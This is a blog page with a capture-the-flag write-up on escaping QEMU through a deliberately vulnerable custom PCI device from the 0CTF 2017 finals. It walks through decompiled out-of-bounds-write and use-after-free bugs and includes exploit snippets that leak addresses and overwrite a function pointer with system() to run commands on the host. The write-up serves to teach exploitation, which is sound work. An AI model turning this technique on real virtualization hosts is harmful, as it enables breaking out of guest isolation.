
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Eadom&#39;s Blog">
    <title>QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup - Eadom&#39;s Blog</title>
    <meta name="author" content="Eadom">
    
    
        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
    
    
        
            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
        
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Eadom","sameAs":["https://github.com/eadom","https://www.linkedin.com/in/yukunliu/","http://weibo.com/onetpig","https://twitter.com/Yufan_L"],"image":"avatar.jpg"},"articleBody":"It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device.\nYou should read VM escape - QEMU Case Study before reading this writeup.\nChallenge12345678910111213141516challenge├── dependency│   ├── libnettle.so.6.2│   └── usr│       └── local│           └── share│               └── qemu│                   ├── bios-256k.bin│                   ├── efi-e1000.rom│                   ├── kvmvapic.bin│                   ├── linuxboot_dma.bin│                   └── vgabios-stdvga.bin├── launch.sh├── qemu-system-x86_64├── rootfs.cpio└── vmlinuz-4.8.0-52-generic\nThere is a qemu-system-x86_64 binary with a launch script, a linux kernel, a initramfs and some dependencies.\nWe can get an interactive shell by executing launch.sh.\n1234567891011    __ __ _____________   __   __    ___    ____   / //_// ____/ ____/ | / /  / /   /   |  / __ )  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  | / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ //_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/Welcome to Tencent KeenlabTencent login: root# uname -r4.8.0-52-generic#\nThe custom vulnerable deviceluanch.sh shows there are two custom device named vdd.\n12$ ./qemu-system-x86_64 -device help 2&gt;&amp;1 | grep VDDname \"VDD\", bus PCI, desc \"KeenLab virtualized Devices For Testing D\"\nwe can use some commands to find these devices and their io port/memroy.\n12345678910111213141516171819# lspci00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:05.0 Class 00ff: 1234:233300:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:2333# cat /proc/iomem...  fe900000-fe9fffff : 0000:00:04.0  fea00000-feafffff : 0000:00:05.0...# cat /proc/ioports...  c000-c0ff : 0000:00:04.0  c100-c1ff : 0000:00:05.0...\nOOBWIn vdd_mmio_write, there is a out-of-bound write vulnerability which copys QEMU heap memory to guset physical memory when we set dma_len larger than sizeof(dam_buf).\n1234567891011121314151617181920212223void __fastcall vdd_mmio_write(TencentPCIState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int64_t v4; // rax@21  if ( opaque-&gt;dma_state )  &#123;    ...    else    &#123;      switch ( addr )      &#123;        ...        case 32uLL:          ((void (__fastcall *)(char *, dma_addr_t, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(            opaque-&gt;dma_buf,            opaque-&gt;dma_state-&gt;dst,            opaque-&gt;dma_len);                   // OOB write          break;        ...      &#125;    &#125;  &#125;&#125;\nUAFAlso in vdd_mmio_write, if addr == 128 and opaque-&gt;sr[129] &amp; 1 != 0, we can set a timer which will execute vdd_dma_timer after opaque-&gt;expire_time ns.\n1234567891011121314151617181920void __fastcall vdd_mmio_write(TencentPCIState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int64_t v4; // rax@21  if ( opaque-&gt;dma_state )  &#123;    ...    else if ( addr &gt; 0x24 )    &#123;      if ( addr == 128 )      &#123;        if ( opaque-&gt;sr[129] &amp; 1 )        &#123;          v4 = qemu_clock_get_ns(0);          timer_mod(&amp;opaque-&gt;dma_timer, v4 + opaque-&gt;expire_time);        &#125;      &#125;      ...  &#125;&#125;\nIn vdd_dma_timer, it invokes opaque-&gt;dma_state-&gt;phys_mem_read/write.\n123456789101112131415void __fastcall vdd_dma_timer(TencentPCIState *opaque)&#123;  if ( opaque-&gt;dma_state-&gt;cmd )    ((void (__fastcall *)(char *, dma_addr_t, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(      opaque-&gt;dma_buf,      opaque-&gt;dma_state-&gt;dst,      opaque-&gt;dma_len &amp; 0x2FF);  else    ((void (__fastcall *)(char *, dma_addr_t, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(      opaque-&gt;dma_buf,      opaque-&gt;dma_state-&gt;dst,      opaque-&gt;dma_len &amp; 0x2FF);  if ( opaque-&gt;dma_state-&gt;cmd == 1 )    vdd_raise_irq(opaque, 0x100u);&#125;\nIf pci_vdd_uninit is invoked before vdd_dma_timer, the dma_state will be  used after free.\n12345678910111213141516void __fastcall pci_vdd_uninit(TencentPCIState *opaque)&#123;  __int64 v1; // rax@5  __int64 v2; // [rsp+28h] [rbp-8h]@1  v2 = *MK_FP(__FS__, 40LL);  memset(opaque-&gt;sr, 0, 0x100uLL);  if ( opaque-&gt;dma_state )  &#123;    memset(opaque-&gt;dma_state, 0, 0x330uLL);    g_free((rcu_head *)opaque-&gt;dma_state);  &#125;  if ( opaque-&gt;buf )    g_free((rcu_head *)opaque-&gt;buf);  v1 = *MK_FP(__FS__, 40LL) ^ v2;&#125;\nExploitationThe exploitation is divided into two steps: \n\nleak QEMU program address. \nhijack control flow\n\nLeak QEMU program addressFirst, we allocate a buffer and get it’s physical address. Then we set dma_state-&gt;dst to our buffer and set dma_len larger than sizeof(dma_buf). Finally, we trigger phys_mem_write by writel(0, piomem + 32). By searching the output, we can find libc addresses and program addresses then calculate the base address of program/libc. \n1234567891011121314151617181920void phys_mem_write(unsigned int dst, unsigned int len)&#123;    set_dmastate_dst(dst);    set_dmalen(len);    writel(0, piomem + 32);&#125;void mem_leak(void)&#123;    pbuf = (unsigned long)kmalloc(0x10000, GFP_KERNEL);    memset(pbuf, 0, 0x10000);    phys_mem_write(virt_to_phys(pbuf), 0x1000);    // xxd(pbuf, 0x1000);    libc_base = search_libc_addr(pbuf, 0x1000);    printk(\"libc base:0x%lx\\n\", libc_base);    prog_base = search_prog_addr(pbuf, 0x1000);    printk(\"program base:0x%lx\\n\", prog_base);    system_addr = prog_base + SYSTEM_OFFSET;    printk(\"system addr:0x%lx\\n\", system_addr);&#125;\nControl RIPThere are three steps to exploit the use-after-free vulnerability:\n\nset a timer\ntrigger pci_vdd_uninit\nreallocte and rewrite dma_state\n\nThe following command can trigger pci_vdd_uninit\n1echo 0 &gt; /sys/bus/pci/slots/4/power\nWhen vdd_dma_timer runs, we can control rip.\n123456789101112131415void __fastcall vdd_dma_timer(TencentPCIState *opaque)&#123;  if ( opaque-&gt;dma_state-&gt;cmd )    ((void (__fastcall *)(char *, dma_addr_t, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(      opaque-&gt;dma_buf,      opaque-&gt;dma_state-&gt;dst,      opaque-&gt;dma_len &amp; 0x2FF);  else    ((void (__fastcall *)(char *, dma_addr_t, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(      opaque-&gt;dma_buf,      opaque-&gt;dma_state-&gt;dst,      opaque-&gt;dma_len &amp; 0x2FF);  if ( opaque-&gt;dma_state-&gt;cmd == 1 )    vdd_raise_irq(opaque, 0x100u);&#125;\nBecasue the QEMU is launched with --nographic -append &#39;console=ttyS0&#39;, so we can simply invoke system(cmd) to run a command in host machine and the output will show in console.\nTo invoke system(cmd), We need to: \n\nset opaque-&gt;dma_state-&gt;phys_mem_read to system\nset opaque-&gt;dma_buf to cmd\nmake sure opaque-&gt;dma_state-&gt;cmd != 0.\n\nIn vdd_linear_write, when addr == 0, a buffer will be allocated with size of opaque-&gt;dma_len. And the data in opaque-&gt;dma_state-&gt;src with length of opaque-&gt;dma_len will be copied to opaque-&gt;buf, then copied to opaque-&gt;dma_state-&gt;dst\n1234567891011121314151617void __fastcall vdd_linear_write(TencentPCIState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  if ( opaque-&gt;dma_state &amp;&amp; addr &lt;= 13 )  &#123;    switch ( (_DWORD)((char *)off_6EF324 + off_6EF324[addr]) )    &#123;      case 0:        if ( opaque-&gt;buf )          g_free((rcu_head *)opaque-&gt;buf);        opaque-&gt;buf = (uint8_t *)g_malloc0(opaque-&gt;dma_len);        vdd_dma_read(opaque-&gt;buf, opaque-&gt;dma_state-&gt;src, opaque-&gt;dma_len);        vdd_dma_write(opaque-&gt;buf, opaque-&gt;dma_state-&gt;dst, opaque-&gt;dma_len);        break;      ...    &#125;  &#125;&#125;\n1234567891011void put_fake_dma(void)&#123;    struct dma fakedma;    fakedma.cmd = 2;    fakedma.phys_mem_read = system_addr;    memcpy(pbuf, (void *)&amp;fakedma, sizeof(fakedma));    set_dmalen(0x330);    set_dmastate_src(virt_to_phys(pbuf));    set_dmastate_dst(virt_to_phys(pbuf));    outb(0, VDB_PORT + 0);&#125;\n\nExploit script\nThanks for Atum’s help.\n","dateCreated":"2017-06-16T00:04:14+08:00","dateModified":"2025-11-21T20:45:50+08:00","datePublished":"2017-06-16T00:04:14+08:00","description":"","headline":"QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"},"publisher":{"@type":"Organization","name":"Eadom","sameAs":["https://github.com/eadom","https://www.linkedin.com/in/yukunliu/","http://weibo.com/onetpig","https://twitter.com/Yufan_L"],"image":"avatar.jpg","logo":{"@type":"ImageObject","url":"avatar.jpg"}},"url":"https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/","keywords":"writeup, 0ctf, qemu"}</script>
    <meta name="description" content="It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device. You should read VM escape - QEMU Case Study before reading this writeup. Challenge">
<meta name="keywords" content="writeup,0ctf,qemu">
<meta property="og:type" content="blog">
<meta property="og:title" content="QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup">
<meta property="og:url" content="https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/index.html">
<meta property="og:site_name" content="Eadom&#39;s Blog">
<meta property="og:description" content="It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device. You should read VM escape - QEMU Case Study before reading this writeup. Challenge">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.imgur.com/tixAsK6.png">
<meta property="og:updated_time" content="2025-11-21T12:45:50.792Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup">
<meta name="twitter:description" content="It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device. You should read VM escape - QEMU Case Study before reading this writeup. Challenge">
<meta name="twitter:image" content="https://i.imgur.com/tixAsK6.png">
<meta name="twitter:creator" content="@Yufan_L">
    
    
        
    
    
        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-sifsy9oex2dugunw1y6dni61b2yek7gdovchv6fh3t7csw6uv5ophjuqcfmz.min.css">
    <!--STYLES END-->
    

    
    <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            Eadom&#39;s Blog
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Eadom</h4>
                
                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="Home"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="Categories"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="Tags"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="Archives"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="About"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/eadom"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/in/yukunliu/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="http://weibo.com/onetpig"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Weibo"
                        >
                        <i class="sidebar-button-icon fab fa-weibo" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Weibo</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/Yufan_L"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/atom.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title">
            QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2017-06-16T00:04:14+08:00">
	
		    Jun 16, 2017
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device.</p>
<p>You should read <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">VM escape - QEMU Case Study</a> before reading this writeup.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">challenge</span><br><span class="line">├── dependency</span><br><span class="line">│   ├── libnettle.so.6.2</span><br><span class="line">│   └── usr</span><br><span class="line">│       └── local</span><br><span class="line">│           └── share</span><br><span class="line">│               └── qemu</span><br><span class="line">│                   ├── bios-256k.bin</span><br><span class="line">│                   ├── efi-e1000.rom</span><br><span class="line">│                   ├── kvmvapic.bin</span><br><span class="line">│                   ├── linuxboot_dma.bin</span><br><span class="line">│                   └── vgabios-stdvga.bin</span><br><span class="line">├── launch.sh</span><br><span class="line">├── qemu-system-x86_64</span><br><span class="line">├── rootfs.cpio</span><br><span class="line">└── vmlinuz-4.8.0-52-generic</span><br></pre></td></tr></table></figure>
<p>There is a <em>qemu-system-x86_64</em> binary with a launch script, a linux kernel, a initramfs and some dependencies.</p>
<p>We can get an interactive shell by executing <code>launch.sh</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   / //_// ____/ ____/ | / /  / /   /   |  / __ )</span><br><span class="line">  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |</span><br><span class="line"> / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /</span><br><span class="line">/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/</span><br><span class="line"></span><br><span class="line">Welcome to Tencent Keenlab</span><br><span class="line">Tencent login: root</span><br><span class="line"># uname -r</span><br><span class="line">4.8.0-52-generic</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<h2 id="The-custom-vulnerable-device"><a href="#The-custom-vulnerable-device" class="headerlink" title="The custom vulnerable device"></a>The custom vulnerable device</h2><p><em>luanch.sh</em> shows there are two custom device named <em>vdd</em>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./qemu-system-x86_64 -device help 2&gt;&amp;1 | grep VDD</span><br><span class="line">name "VDD", bus PCI, desc "KeenLab virtualized Devices For Testing D"</span><br></pre></td></tr></table></figure>
<p>we can use some commands to find these devices and their io port/memroy.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:05.0 Class 00ff: 1234:2333</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"><span class="meta">#</span> cat /proc/iomem</span><br><span class="line">...</span><br><span class="line">  fe900000-fe9fffff : 0000:00:04.0</span><br><span class="line">  fea00000-feafffff : 0000:00:05.0</span><br><span class="line">...</span><br><span class="line"><span class="meta">#</span> cat /proc/ioports</span><br><span class="line">...</span><br><span class="line">  c000-c0ff : 0000:00:04.0</span><br><span class="line">  c100-c1ff : 0000:00:05.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="OOBW"><a href="#OOBW" class="headerlink" title="OOBW"></a>OOBW</h3><p>In <code>vdd_mmio_write</code>, there is a out-of-bound write vulnerability which copys QEMU heap memory to guset physical memory when we set <code>dma_len</code> larger than <code>sizeof(dam_buf)</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( addr )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32u</span>LL:</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">            opaque-&gt;dma_buf,</span><br><span class="line">            opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">            opaque-&gt;dma_len);                   <span class="comment">// OOB write</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Also in <code>vdd_mmio_write</code>, if <code>addr == 128</code> and <code>opaque-&gt;sr[129] &amp; 1 != 0</code>, we can set a timer which will execute <code>vdd_dma_timer</code> after <code>opaque-&gt;expire_time</code> ns.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( opaque-&gt;sr[<span class="number">129</span>] &amp; <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = qemu_clock_get_ns(<span class="number">0</span>);</span><br><span class="line">          timer_mod(&amp;opaque-&gt;dma_timer, v4 + opaque-&gt;expire_time);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In <code>vdd_dma_timer</code>, it invokes <code>opaque-&gt;dma_state-&gt;phys_mem_read/write</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</span><br><span class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If <code>pci_vdd_uninit</code> is invoked before <code>vdd_dma_timer</code>, the <em>dma_state</em> will be  used after free.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_vdd_uninit</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax@5</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(opaque-&gt;sr, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(opaque-&gt;dma_state, <span class="number">0</span>, <span class="number">0x330</span>uLL);</span><br><span class="line">    g_free((rcu_head *)opaque-&gt;dma_state);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;buf )</span><br><span class="line">    g_free((rcu_head *)opaque-&gt;buf);</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is divided into two steps: </p>
<ol>
<li>leak QEMU program address. </li>
<li>hijack control flow</li>
</ol>
<h3 id="Leak-QEMU-program-address"><a href="#Leak-QEMU-program-address" class="headerlink" title="Leak QEMU program address"></a>Leak QEMU program address</h3><p>First, we allocate a buffer and get it’s physical address. Then we set <code>dma_state-&gt;dst</code> to our buffer and set <code>dma_len</code> larger than <code>sizeof(dma_buf)</code>. Finally, we trigger <code>phys_mem_write</code> by <code>writel(0, piomem + 32)</code>. By searching the output, we can find libc addresses and program addresses then calculate the base address of program/libc. </p>
